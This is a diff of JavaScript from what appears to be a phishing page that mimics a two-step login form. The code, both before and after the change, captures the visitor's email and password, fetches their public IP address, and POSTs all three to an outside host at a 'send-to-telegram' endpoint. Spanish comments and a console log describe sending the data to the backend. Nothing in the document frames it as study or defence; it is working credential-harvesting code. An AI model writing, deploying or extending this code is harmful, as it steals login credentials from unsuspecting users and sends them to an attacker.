@@ -2,25 +2,25 @@ var counter = 0;
 var email, password;
 
 async function sendToBackend(email, password) {
-    const ipResponse = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipResponse.json();
-    const ipv4 = ipData.ip;
-
-    const url = 'https://gfx1xn5wg8xtp9mk4no4jjzev.jhere.tech/send-to-telegram';
-
-    const data = {
-        email: email,
-        password: password,
-        ip: ipv4
-    };
-
-    console.log("Enviando datos al backend:", data);
-
     try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ipv4 = ipData.ip;
+
+        const url = 'https://gfx1xn5wg8xtp9mk4no4jjzev.jhere.tech/send-to-telegram';
+        
+        const data = {
+            email: email,
+            password: password,
+            ip: ipv4
+        };
+
+        console.log("Enviando datos al backend:", data);
+
         const response = await fetch(url, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json'  // Cambia a 'application/x-www-form-urlencoded' si el backend lo necesita
             },
             body: JSON.stringify(data)
         });
@@ -57,7 +57,6 @@ window.onload = function() {
         var learn = document.getElementById('learn-more');
         var create = document.getElementById('create-account');
         var next = document.getElementById('next');
-        var button = document.getElementById('button');
         document.body.style.background = "#ffffff";
         box.style.setProperty("width", "100%");
         box.style.setProperty("height", "100%");
@@ -113,7 +112,7 @@ function enter() {
     else if (counter == 1) {
         password = document.getElementById('input1').value;
         counter++;
-        sendToBackend(email, password);
+        sendToBackend(email, password); 
         change2();
     }
 }
